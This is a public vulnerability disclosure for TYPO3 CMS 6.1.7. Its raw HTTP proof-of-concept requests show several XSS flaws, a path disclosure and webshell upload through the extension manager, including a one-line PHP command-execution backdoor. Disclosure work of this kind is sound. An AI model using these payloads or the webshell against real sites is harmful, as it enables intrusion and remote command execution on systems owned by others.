@@ -1,0 +1,160 @@
+id: 21944
+date: 02/25/2014
+title: TYPO3 6.1.7 XSS / Disclosure / Shell Upload
+author: HauntIT
+cves: 
+
+# ==============================================================
+# Title ...| Multiple vulnerabilities in Typo3 CMS
+# Version .| introductionpackage-6.1.7
+# Date ....| 24.02.2014
+# Found ...| HauntIT Blog
+# Home ....| www.typo3.org
+# ==============================================================
+
+From admin user:
+
+# ==============================================================
+# 1. XSS
+
+---<request>---
+POST /k/cms/intro/introductionpackage-6.1.7/typo3/mod.php?M=tools_txschedulerM1&CMD=edit&tx_scheduler[uid]=1 HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 329
+
+SET%5Bfunction%5D=scheduler&CMD=save&tx_scheduler%5Buid%5D=1&previousCMD=edit&tx_scheduler%5Bdisable%5D=0&tx_scheduler%5Bclass%5D='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&tx_scheduler%5Btype%5D=2&tx_scheduler%5Bstart%5D=00%3A00+01-10-2011&tx_scheduler%5Bend%5D=&tx_scheduler%5Bfrequency%5D=0+*+*+*+*&tx_scheduler%5Bmultiple%5D=0
+---<request>---
+
+---<response>---
+Class</label></abbr></span></td><td class="td-input"> 
+()<input type="hidden" name="tx_scheduler[class]" id="task_class" value="'>"><body/onload=alert(9999)>" />
+---<response>---
+
+
+# ==============================================================
+# 2. Shell upload possibility
+
+If admin is logged in he can add 'extension' in ZIP file. So there is a possibility to install webshell 
+located in zipped PHP file. Backdoor will be available (like) here:
+---<code>---
+/home/k/public_html/cms/intro/introductionpackage-6.1.7/typo3conf/ext/mishell/mishell.php:1:
+<?php system($_REQUEST['cmd']);?>
+---<code>---
+
+The 'good news' (for user who hijacked admin's accout) is that the backdoor won't be visible 
+from Extention Manager.
+
+
+# ==============================================================
+# 3. Information disclosure bug
+
+---<request>---
+POST /k/cms/intro/introductionpackage-6.1.7/typo3/mod.php?M=tools_ExtensionmanagerExtensionmanager&tx_extensionmanager_tools_extensionmanagerextensionmanager%5Baction%5D=extract&tx_extensionmanager_tools_extensionmanagerextensionmanager%5Bcontroller%5D=UploadExtensionFile&tx_extensionmanager_tools_extensionmanagerextensionmanager%5Bformat%5D=json HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 1986
+
+-----------------------------147561664023554
+Content-Disposition: form-data; name="tx_extensionmanager_tools_extensionmanagerextensionmanager[__referrer][@extension]"
+
+Extensionmanager
+-----------------------------147561664023554
+Content-Disposition: form-data; name="tx_extensionmanager_tools_extensionmanagerextensionmanager[__referrer][@vendor]"
+
+TYPO3\CMS
+-----------------------------147561664023554
+Content-Disposition: form-data; name="tx_extensionmanager_tools_extensionmanagerextensionmanager[__referrer][@controller]"
+
+UploadExtensionFile
+-----------------------------147561664023554
+Content-Disposition: form-data; name="tx_extensionmanager_tools_extensionmanagerextensionmanager[__referrer][@action]"
+
+form
+-----------------------------147561664023554
+Content-Disposition: form-data; name="tx_extensionmanager_tools_extensionmanagerextensionmanager[__referrer][arguments]"
+
+YToyOntzOjY6ImFjdGlvbiI7czo0OiJmb3JtIjtzOjEwOiJjb250cm9sbGVyIjtzOjE5OiJVcGxvYWRFeHRlbnNpb25GaWxlIjt9190c41a301fed009dff796152c31d68de5be7721
+-----------------------------147561664023554
+Content-Disposition: form-data; name="tx_extensionmanager_tools_extensionmanagerextensionmanager[__trustedProperties]"
+
+a:2:{s:13:"extensionFile";a:5:{s:4:"name";i:1;s:4:"type";i:1;s:8:"tmp_name";i:1;s:5:"error";i:1;s:4:"size";i:1;}s:9:"overwrite";i:1;}7b7da06281d8102e2c39d7a0d4d40655f5f5603c
+-----------------------------147561664023554
+Content-Disposition: form-data; name="tx_extensionmanager_tools_extensionmanagerextensionmanager[extensionFile]"; filename="mishell.zip"
+Content-Type: application/zip
+
+blah...
+-----------------------------147561664023554
+Content-Disposition: form-data; name="tx_extensionmanager_tools_extensionmanagerextensionmanager[overwrite]"
+
+'`"%3b--#%%2f%2a
+-----------------------------147561664023554--
+
+---<request>---
+
+And then:
+
+---<response>---
+
+{"success":"true","extension":null,"error":"PHP Catchable Fatal Error: Argument 1 passed to TYPO3\\CMS\\Extensionmanager\\Utility\\InstallUtility::processDatabaseUpdates() must be of the type array, null given, called in \/home\/k\/public_html\/cms\/intro\/introductionpackage-6.1.7\/typo3\/sysext\/extensionmanager\/Classes\/Utility\/InstallUtility.php on line 133 and defined in \/home\/k\/public_html\/cms\/intro\/introductionpackage-6.1.7\/typo3\/sysext\/extensionmanager\/Classes\/Utility\/InstallUtility.php line 244"}
+---<response>---
+
+# ==============================================================
+# 4. DOM-based XSS
+
+
+---<request>---
+GET /k/cms/intro/introductionpackage-6.1.7/typo3/sysext/rtehtmlarea/mod4/select_image.php?&RTEtsConfigParams=';//</script><script>alert(132)</script>&editorNo=data_tx_news_domain_model_news__NEW530b1d080b773__bodytext_&sys_language_content=0&contentTypo3Language=default HTTP/1.1
+---<request>---
+
+---<response>---
+(...)
+ '|data_tx_news_domain_model_news__NEW530b1d080b773__bodytext_:0|';//</script><script>alert(132)</script>|'); }
+(...)
+---<response>---
+
+
+
+# ==============================================================
+# 5. DOM-based XSS
+
+---<request>---
+GET /k/cms/intro/introductionpackage-6.1.7/typo3/sysext/rtehtmlarea/mod4/select_image.php?act=plain&bparams=|data_tx_n';//</script><script>alert(123123)</script>domain_model_news__NEW530b1d080b773__bodytext_:0|tx_news_domain_model_news:NEW530b1d080b773:bodytext:0:0:0:|&editorNo=data_tx_news_domain_model_news__NEW530b1d080b773__bodytext_&sys_language_content=0&RTEtsConfigParams=tx_news_domain_model_news%3ANEW530b1d080b773%3Abodytext%3A0%3A0%3A0%3A HTTP/1.1
+---<request>---
+
+
+---<response>---
+(...)
+  var plugin = window.parent.RTEarea["data_tx_n';//</script><script>alert(123123)</script>domain_model_news__NEW530b1d080b773__bodytext_"].editor.getPlugin("TYPO3Image");
+  var HTMLArea = window.parent.HTMLArea;
+
+  HTMLArea.TYPO3Image.insertElement = function (table, uid, type, filename, filePath, fileExt, fileIcon) {
+    return jumpToUrl('?editorNo=' + 'data_tx_n';//</script><script>alert(123123)</script>domain_model_news__NEW530b1d080b773__bodytext_' + '&insertImage=' + filePath + '&table=' + table + '&uid=' + uid + '&type=' + type + 'bparams=' + '|data_tx_n';//</script><script>alert(123123)</script>domain_model_news__NEW530b1d080b773__bodyte
+(...)
+---<response>---
+
+
+====================================================================
+[+] Now for  "simple_editor" user:
+====================================================================
+
+# ==============================================================
+# 6. XSS
+
+
+---<request>---
+POST /k/cms/intro/introductionpackage-6.1.7/typo3/tce_file.php HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 349
+
+file%5Beditfile%5D%5B0%5D%5Bdata%5D=%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%0D%0A&target=1&file%5Beditfile%5D%5B0%5D%5Btarget%5D=180&redirect=%2Fk%2Fcms%2Fintro%2Fintroductionpackage-6.1.7%2Ftypo3%2Fmod.php%3F%26id%3D1%253A%252Fuser_upload%252Fdocuments%252Fasdasd%252F%26M%3Dfile_list%26SET%5BbigControlPanel%5D%3D1
+---<request>---
+
+
+# ==============================================================
+# More @ http://HauntIT.blogspot.com
+# Thanks! ;)
+# o/
+
+#  0day.today [2023-03-23]  #
